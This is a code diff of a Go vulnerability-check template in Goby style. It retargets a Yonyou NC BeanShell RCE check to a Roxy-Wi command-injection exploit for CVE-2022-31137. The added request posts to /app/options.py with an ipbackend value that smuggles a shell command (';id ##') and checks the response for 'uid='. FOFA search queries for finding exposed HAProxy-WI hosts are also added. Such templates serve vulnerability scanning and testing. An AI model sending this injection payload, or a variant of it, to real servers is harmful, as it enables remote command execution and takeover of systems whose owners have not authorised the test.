@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "Roxy-Wi options.py 远程命令执行漏洞 CVE-2022-31137",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"HAProxy-WI\" || product=\"HAProxy-WI\"",
+  "GobyQuery": "app=\"HAProxy-WI\" || product=\"HAProxy-WI\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,12 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/app/options.py",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
-        "data": ""
+        "data": "alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "uid=",
             "bz": ""
           }
         ]
@@ -107,7 +107,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "Roxy-Wi options.py 远程命令执行漏洞 CVE-2022-31137",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +116,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Roxy-Wi rce CVE-2022-31137",
       "Product": "",
       "Description": "",
       "Recommendation": "",
